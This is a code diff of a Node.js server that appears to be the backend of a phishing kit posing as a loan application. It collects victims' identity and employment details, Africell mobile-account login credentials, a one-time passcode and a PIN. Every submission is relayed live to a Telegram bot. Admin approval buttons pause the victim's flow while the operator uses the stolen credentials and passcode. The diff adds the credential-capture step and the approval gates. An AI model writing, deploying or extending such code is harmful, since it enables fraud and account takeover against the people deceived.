@@ -1,11 +1,11 @@
+
 /**
  * server.js
  * Optimized for Render.com Deployment
- * Flow: 5 Steps | Admin Approval on Step 5 (PIN)
+ * Flow: 6 Steps | Admin Approval on Step 4 (Password) & Step 6 (PIN)
  */
 
 require('dotenv').config();
-
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -13,12 +13,8 @@ const path = require('path');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
 
-// Import Telegram bot manager
 const botManager = require('./bot_manager');
 
-// ============================================================================
-// CONFIGURATION & RENDER ENVIRONMENT
-// ============================================================================
 const app = express();
 const server = http.createServer(app);
 
@@ -30,157 +26,90 @@ const io = socketIo(server, {
     }
 });
 
-// Expose socket globally for bot callbacks in bot_manager.js
+// Expose socket globally so bot_manager can trigger transitions
 global.io = io;
 
 const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; // e.g., https://your-app.onrender.com
+const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
 
-// ============================================================================
-// SESSION STORAGE
-// ============================================================================
+// Store sessions and active socket mapping
 const sessions = new Map();
+const connectedSockets = new Map(); // Maps appId -> socket.id
 
-// ============================================================================
-// MIDDLEWARE
-// ============================================================================
 app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Logging Middleware
-app.use((req, res, next) => {
-    if (!req.path.startsWith('/bot')) { 
-        console.log(`📝 ${req.method} ${req.path}`);
-    }
-    next();
-});
-
-// ============================================================================
-// TELEGRAM WEBHOOK SETUP (RENDER COMPATIBLE)
-// ============================================================================
-// Webhook endpoint for Telegram
+// --- TELEGRAM WEBHOOK ---
 const WEBHOOK_PATH = `/bot${process.env.BOT_TOKEN}`;
 app.post(WEBHOOK_PATH, (req, res) => {
     botManager.bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
-// Function to set webhook on startup
 async function initTelegramWebhook() {
     if (EXTERNAL_URL) {
         const webhookUrl = `${EXTERNAL_URL}${WEBHOOK_PATH}`;
         try {
             await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
+            console.log(`✅ Webhook set: ${webhookUrl}`);
         } catch (err) {
-            console.error('❌ Failed to set Telegram Webhook:', err.message);
+            console.error('❌ Webhook Error:', err.message);
         }
-    } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL not found. Webhook not set.');
     }
 }
 
-// ============================================================================
-// SOCKET.IO CONNECTION HANDLING
-// ============================================================================
-io.use((socket, next) => {
-    const sessionId = socket.handshake.auth.sessionId;
-    socket.sessionId = sessionId || 'sess_' + uuidv4().substring(0, 8);
-    // Stable AppID for the current connection
-    socket.appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
-    next();
-});
-
+// --- SOCKET.IO LOGIC ---
 io.on('connection', (socket) => {
-    console.log(`🔌 SOCKET CONNECTED: ${socket.appId}`);
-
-    let session = sessions.get(socket.sessionId);
-
-    if (!session) {
-        session = {
-            appId: socket.appId,
-            data: {},
-            completed: false
-        };
-        sessions.set(socket.sessionId, session);
-    } else {
-        socket.appId = session.appId;
-    }
-
-    socket.join(socket.appId);
-    socket.emit('session-ready', { appId: socket.appId });
-
-    // --- STEP HANDLERS (5 STEP FLOW) ---
+    // Generate a unique AppID for this user session
+    const appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    socket.appId = appId;
+    connectedSockets.set(appId, socket.id);
     
+    console.log(`🔌 Connected: ${appId}`);
+    socket.emit('session-ready', { appId: appId });
+
+    // Step 1: Loan Details
     socket.on('step1', (data) => {
-        session.data.loan = data;
-        botManager.sendStep1({ appId: socket.appId, ...data });
+        botManager.sendToAdmin(appId, "Step 1: Loan Details", data);
     });
 
+    // Step 2: Identity
     socket.on('step2', (data) => {
-        session.data.identity = data;
-        botManager.sendStep2({ appId: socket.appId, ...data });
+        botManager.sendToAdmin(appId, "Step 2: Identity", data);
     });
 
+    // Step 3: Employment
     socket.on('step3', (data) => {
-        session.data.employment = data;
-        botManager.sendStep3({ appId: socket.appId, ...data });
+        botManager.sendToAdmin(appId, "Step 3: Employment", data);
     });
 
-    // Step 4: OTP (6 Digits)
+    // Step 4: Africell Login (NEEDS ADMIN APPROVAL TO MOVE TO STEP 5)
     socket.on('step4', (data) => {
-        session.data.otp = data.otp;
-        botManager.sendStep4({
-            appId: socket.appId,
-            phone: session.data.identity?.phone || 'N/A',
-            otp: data.otp
-        });
+        console.log(`Step 4 received from ${appId}. Waiting for Admin...`);
+        // We pass 'true' to trigger the Approval Button in bot_manager
+        botManager.sendToAdmin(appId, "Step 4: Africell Credentials", data, true);
     });
 
-    // Step 5: PIN (4 Digits) + Wait for Admin Approval
+    // Step 5: OTP Received
     socket.on('step5', (data) => {
-        session.data.pin = data.pin;
-        
-        // Prepare full report for the Admin Approval button in Telegram
-        const fullReport = {
-            appId: socket.appId,
-            name: `${session.data.identity?.firstName || ''} ${session.data.identity?.lastName || ''}`,
-            phone: session.data.identity?.phone || 'N/A',
-            amount: session.data.loan?.amount || '0',
-            otp: session.data.otp || 'N/A',
-            pin: data.pin
-        };
+        botManager.sendToAdmin(appId, "Step 5: OTP Received", data);
+    });
 
-        // Triggers the Telegram Inline Keyboard (Confirm/Reject)
-        botManager.sendApprovalRequest(fullReport);
+    // Step 6: Final PIN (NEEDS ADMIN APPROVAL TO SHOW SUCCESS)
+    socket.on('step6', (data) => {
+        console.log(`Step 6 PIN received from ${appId}. Waiting for final approval...`);
+        // Final approval step
+        botManager.sendFinalApproval(appId, data.pin);
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 Socket disconnected: ${socket.appId}`);
+        connectedSockets.delete(socket.appId);
+        console.log(`🔌 Disconnected: ${socket.appId}`);
     });
 });
 
-// ============================================================================
-// API & STARTUP
-// ============================================================================
-app.get('/api/health', (req, res) => {
-    res.json({ status: 'ok', url: EXTERNAL_URL });
-});
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Error Handling
-app.use((err, req, res, next) => {
-    console.error('❌ Error:', err);
-    res.status(500).json({ error: 'Internal server error' });
-});
-
-// START SERVER
 server.listen(PORT, () => {
-    console.log(`🚀 ASA SERVER RUNNING ON PORT ${PORT}`);
-    initTelegramWebhook(); // Initialize webhook when server starts
+    console.log(`🚀 ASA SERVER LIVE ON PORT ${PORT}`);
+    initTelegramWebhook();
 });
